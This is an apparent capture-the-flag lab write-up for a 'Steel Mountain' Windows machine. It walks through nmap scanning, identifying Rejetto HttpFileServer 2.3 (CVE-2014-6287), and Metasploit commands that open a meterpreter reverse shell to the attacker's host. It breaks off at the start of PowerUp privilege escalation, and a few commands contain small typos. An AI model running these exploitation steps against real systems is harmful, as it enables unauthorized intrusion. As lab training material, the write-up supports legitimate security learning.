## Steel Mountain 

- Enumerate windows machine,
- Gain Initial access with Metasploit,
- Use Powershell to further enumerate and escalete privileges to administrator.

---

## Initial Access 

**Scan the machine with nmap. What is the other port running a web server on ?** 

`sudo nmap -p- 10.10.133.113 -Pn`

![Image](/img/nmap_scan.png)

**Take a look at the other web server. What file server is running ?**

`sudo nmap -sCV -p 8080 10.10.133.113 -Pn`

![Image](/img/httpfileserver.png)

**View page :**

![Image](/img/fileweb.png)

**View page source :**

![Image](/img/rejetto.png)

**What is the CVE number to exploit this file server?**

`searchsploit rejetto httpfileserver 2.3`

![Image](/img/49125.png)

`locate 49125.py`

`more /usr/share/exploitdb/exploits/windows/webapps/49125.py`

![Image](/img/49125_view.png)

**Use Metasploit to get an initial shell. What is the user flag?**

```
msfconsole
search CVE-2014-6287 
use exploit/windows/http/rejetto_hfs_exec
show options
set lhost 10.9.43.163
set lport 4444
set rhost 10.10.133.144
set rport 8080
set target uri /
set payload windows/meterpreter/reverse_tcp)
run
```
![Image](/img/meterpreter.png)

---

## Privilege Escalation

To enumerate this machine, we will use a powershell script called PowerUp . Download this script from here https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 and then upload it to the target.

`upload /home/kali/privesc/windows/scripts/PowerUp.ps1`

![Image](/img/upload.png)

`load powershell`

`powershell_shell`


























